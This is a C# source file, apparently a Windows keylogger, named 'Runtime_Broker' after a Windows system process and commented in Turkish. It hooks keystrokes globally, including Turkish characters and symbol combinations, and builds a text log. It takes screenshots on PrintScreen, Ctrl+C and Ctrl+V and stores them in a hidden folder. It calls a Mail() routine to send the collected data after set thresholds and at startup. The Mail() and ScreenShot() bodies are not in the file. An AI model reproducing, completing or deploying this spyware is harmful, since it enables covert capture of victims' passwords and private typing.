using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Runtime_Broker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Tusdinle();
        }
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;

        globalKeyboardHook klavye = new globalKeyboardHook();
        static byte number = 0;
        static byte maxnumber = 55; // değiştirilebilir
        static byte ssadet = 0;
        static byte maxssadet = 3;
        string log = "";
        static bool connect = false;
        static bool BigChar;
        static bool ctrl = false;
        static bool alt = false;
        static bool shift = false;
        public static string resimyolu = @"log\pic";
        public static DirectoryInfo di = new DirectoryInfo(resimyolu);
        
       
        #region tus olayları ve dinleme
        void Tusdinle()
        {
            #region ascıı
            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.U);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.Z);
            #endregion

            #region türkçe karakterler
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem6);
            klavye.HookedKeys.Add(Keys.Oem1);
            klavye.HookedKeys.Add(Keys.Oem7);
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem5);
            #endregion

            #region caps back space vb
            klavye.HookedKeys.Add(Keys.OemPeriod);
            klavye.HookedKeys.Add(Keys.Back);
            klavye.HookedKeys.Add(Keys.Space);
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.CapsLock);
            #endregion

            #region rakamlar ve üst rakamlar
            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);

            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);
            #endregion

            #region ctrl shift alt ve printscreen
            klavye.HookedKeys.Add(Keys.LControlKey);
            klavye.HookedKeys.Add(Keys.RControlKey);
            klavye.HookedKeys.Add(Keys.LShiftKey);
            klavye.HookedKeys.Add(Keys.RShiftKey);
            klavye.HookedKeys.Add(Keys.LMenu); // sol alt
            klavye.HookedKeys.Add(Keys.RMenu); // sağ alt
            klavye.HookedKeys.Add(Keys.PrintScreen);
            #endregion

            klavye.KeyDown += new KeyEventHandler(TusBasma);
            klavye.KeyUp += new KeyEventHandler(TusKaldırma);
        }

        void TusKaldırma(object sender, KeyEventArgs e)
        {
            switch (e.KeyCode)
            {
                case Keys.LControlKey:
                case Keys.RControlKey:
                    {
                        ctrl = false;
                        break;
                    }
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    {
                        if (BigChar == true) BigChar = false;
                        else BigChar = true;
                        shift = false;
                        break;
                    }
                case Keys.LMenu:
                case Keys.RMenu:
                    {
                        alt = false;
                        break;
                    }
            }
        }

        void TusBasma(object sender, KeyEventArgs e)
        {
            if (number >= maxnumber || ssadet >= maxssadet) // kontrol
            {
                Mail();
                number = ssadet = 0;
                log = "";
            }
            switch (e.KeyCode)
            {
                #region ctrl shift alt caps
                case Keys.PrintScreen:
                    {
                        ScreenShot();
                        break;
                    }
                case Keys.LControlKey:
                case Keys.RControlKey:
                    {
                        ctrl = true;
                        break;
                    }
                case Keys.CapsLock:
                    {
                        if (BigChar == true) BigChar = false;
                        else BigChar = true;
                        break;
                    }
                case Keys.RShiftKey:
                case Keys.LShiftKey:
                    {
                        if (BigChar == true) BigChar = false;
                        else BigChar = true;
                        shift = true;
                        break;
                    }
                case Keys.RMenu:
                case Keys.LMenu:
                    {
                        alt = true;
                        break;
                    }
                #endregion
                #region NOKTA BACKSPACE
                case Keys.OemPeriod:
                    {
                        log += ".";
                        number++;
                        break;
                    }
                case Keys.Back:
                    {
                        log += "*Back*";
                        number++;
                        break;
                    }
                #endregion
                #region ENTER SPACE
                case Keys.Enter:
                    {
                        log += " -enter- ";
                        number++;
                        break;
                    }
                case Keys.Space:
                    {
                        log += " ";
                        number++;
                        break;
                    }
                #endregion
                #region normal karakterler
                case Keys.A:
                    {
                        if (BigChar == true) log += "A";
                        else log += "a";
                        number++;
                        break;
                    }
                case Keys.B:
                    {
                        if (BigChar == true) log += "B";
                        else log += "b";
                        number++;
                        break;
                    }
                case Keys.C:
                    {
                        if (BigChar == true) log += "C";
                        else log += "c";
                        number++;
                        if (ctrl) ScreenShot();
                        break;
                    }
                case Keys.D:
                    {
                        if (BigChar == true) log += "D";
                        else log += "d";
                        number++;
                        break;
                    }
                case Keys.E:
                    {
                        if (BigChar == true) log += "E";
                        else log += "e";
                        number++;
                        break;
                    }
                case Keys.F:
                    {
                        if (BigChar == true) log += "F";
                        else log += "f";
                        number++;
                        break;
                    }
                case Keys.G:
                    {
                        if (BigChar == true) log += "G";
                        else log += "g";
                        number++;
                        break;
                    }
                case Keys.H:
                    {
                        if (BigChar == true) log += "H";
                        else log += "h";
                        number++;
                        break;
                    }
                case Keys.I:
                    {
                        if (BigChar == true) log += "I";
                        else log += "ı";
                        number++;
                        break;
                    }
                case Keys.J:
                    {
                        if (BigChar == true) log += "J";
                        else log += "j";
                        number++;
                        break;
                    }
                case Keys.K:
                    {
                        if (BigChar == true) log += "K";
                        else log += "k";
                        number++;
                        break;
                    }
                case Keys.L:
                    {
                        if (BigChar == true) log += "L";
                        else log += "l";
                        number++;
                        break;
                    }
                case Keys.M:
                    {
                        if (BigChar == true) log += "M";
                        else log += "m";
                        number++;
                        break;
                    }
                case Keys.N:
                    {
                        if (BigChar == true) log += "N";
                        else log += "n";
                        number++;
                        break;
                    }
                case Keys.O:
                    {
                        if (BigChar == true) log += "O";
                        else log += "o";
                        number++;
                        break;
                    }
                case Keys.P:
                    {
                        if (BigChar == true) log += "P";
                        else log += "p";
                        number++;
                        break;
                    }
                case Keys.Q:
                    {
                        if (BigChar == true) log += "Q";
                        else log += "q";
                        number++;
                        break;
                    }
                case Keys.R:
                    {
                        if (BigChar == true) log += "R";
                        else log += "r";
                        number++;
                        break;
                    }
                case Keys.S:
                    {
                        if (BigChar == true) log += "S";
                        else log += "s";
                        number++;
                        break;
                    }
                case Keys.T:
                    {
                        if (BigChar == true) log += "T";
                        else log += "t";
                        number++;
                        break;
                    }
                case Keys.U:
                    {
                        if (BigChar == true) log += "U";
                        else log += "u";
                        number++;
                        break;
                    }
                case Keys.V:
                    {
                        if (BigChar == true) log += "V";
                        else log += "v";
                        number++;
                        if (ctrl) ScreenShot();
                        break;
                    }
                case Keys.W:
                    {
                        if (BigChar == true) log += "W";
                        else log += "w";
                        number++;
                        break;
                    }
                case Keys.X:
                    {
                        if (BigChar == true) log += "X";
                        else log += "x";
                        number++;
                        break;
                    }
                case Keys.Y:
                    {
                        if (BigChar == true) log += "Y";
                        else log += "y";
                        number++;
                        break;
                    }
                case Keys.Z:
                    {
                        if (BigChar == true) log += "Z";
                        else log += "z";
                        number++;
                        break;
                    }
                #endregion
                #region Türkçe Karakterler
                case Keys.OemOpenBrackets:
                    {
                        if (BigChar == true) log += "Ğ";
                        else log += "ğ";
                        number++;
                        break;
                    }
                case Keys.Oem6:
                    {
                        if (BigChar == true) log += "Ü";
                        else log += "ü";
                        number++;
                        break;
                    }
                case Keys.Oem1:
                    {
                        if (BigChar == true) log += "Ş";
                        else log += "ş";
                        number++;
                        break;
                    }
                case Keys.Oem7:
                    {
                        if (BigChar == true) log += "İ";
                        else log += "i";
                        number++;
                        break;
                    }
                // burada ö harfi var ama istisna durum var aşapıda normal if olarak alındı
                case Keys.Oem5:
                    {
                        if (BigChar == true) log += "Ç";
                        else log += "ç";
                        number++;
                        break;
                    }
                case Keys.OemQuestion:
                    {
                        if (BigChar == true) log += "Ö";
                        else log += "ö";
                        number++;
                        break;
                    }
                #endregion
                #region rakamlar ve üst rakamlar
                case Keys.NumPad0:
                case Keys.D0:
                    {
                        if (alt && ctrl) log += "}";
                        else if (shift) log += "=";
                        else log += "0";
                        number++;
                        break;
                    }
                case Keys.NumPad1:
                case Keys.D1:
                    {
                        if (alt && ctrl) log += ">";
                        else if (shift) log += "!";
                        else log += "1";
                        number++;
                        break;
                    }
                case Keys.NumPad2:
                case Keys.D2:
                    {
                        if (alt && ctrl) log += "£";
                        else if (shift) log += "'";
                        else log += "2";
                        number++;
                        break;
                    }
                case Keys.NumPad3:
                case Keys.D3:
                    {
                        if (alt && ctrl) log += "#";
                        else if (shift) log += "^";
                        else log += "3";
                        number++;
                        break;
                    }
                case Keys.NumPad4:
                case Keys.D4:
                    {
                        if (alt && ctrl) log += "$";
                        else if (shift) log += "+";
                        else log += "4";
                        number++;
                        break;
                    }
                case Keys.NumPad5:
                case Keys.D5:
                    {
                        if (alt && ctrl) log += "½";
                        else if (shift) log += "%";
                        else log += "5";
                        number++;
                        break;
                    }
                case Keys.NumPad6:
                case Keys.D6:
                    {
                        if (shift) log += "&";
                        else log += "6";
                        number++;
                        break;
                    }
                case Keys.NumPad7:
                case Keys.D7:
                    {
                        if (alt && ctrl) log += "{";
                        else if (shift) log += "/";
                        else log += "7";
                        number++;
                        break;
                    }
                case Keys.NumPad8:
                case Keys.D8:
                    {
                        if (alt && ctrl) log += "[";
                        else if (shift) log += "(";
                        else log += "8";
                        number++;
                        break;
                    }
                case Keys.NumPad9:
                case Keys.D9:
                    {
                        if (alt && ctrl) log += "]";
                        else if (shift) log += ")";
                        else log += "9";
                        number++;
                        break;
                    }
                    #endregion
            }
        }
        #endregion

        private void form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(resimyolu))
            {
                DirectoryInfo di = Directory.CreateDirectory(resimyolu); 
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden; 
            }

            foreach (FileInfo file in di.GetFiles())
            {
                Mail();
                break;
            }

            if (Control.IsKeyLocked(Keys.CapsLock)) BigChar = true;
            else BigChar = false;

            

        }
    }
}
